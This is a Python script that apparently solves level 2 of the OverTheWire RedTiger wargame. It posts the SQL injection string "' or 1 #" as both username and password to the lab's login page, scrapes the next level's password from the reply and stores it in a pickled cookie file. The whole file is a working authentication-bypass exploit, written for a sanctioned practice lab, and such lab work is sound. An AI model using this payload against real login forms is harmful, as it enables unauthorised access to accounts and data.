import requests
from requests.exceptions import HTTPError
import pickle
from bs4 import BeautifulSoup
import re


def get_request(url: str, param: dict, cooks={}, method='get') -> str:
    try:
        response = (requests.get(url, params=param, cookies=cooks)
                    if method == 'get' else
                    requests.post(url, data=param, cookies=cooks))
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        return response.text


def extract_pass(response: str):
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile("password"))
    return passw


def main():
    pass_r = 'The password for the next level is: '

    with open('cooks.pickle', 'rb') as f:
        cooks = pickle.load(f)

    url = "https://redtiger.labs.overthewire.org/level2.php"

    param = dict(
        username="' or 1 #",
        password="' or 1 #",
        login="Login"
    )

    response = get_request(url, param, cooks, method='post')
    passw = extract_pass(response)
    print(passw)
    cooks = dict(cooks, level3login=passw.replace(pass_r, ''))
    with open('cooks.pickle', 'wb') as f:
        pickle.dump(cooks, f)


if __name__ == '__main__':
    main()
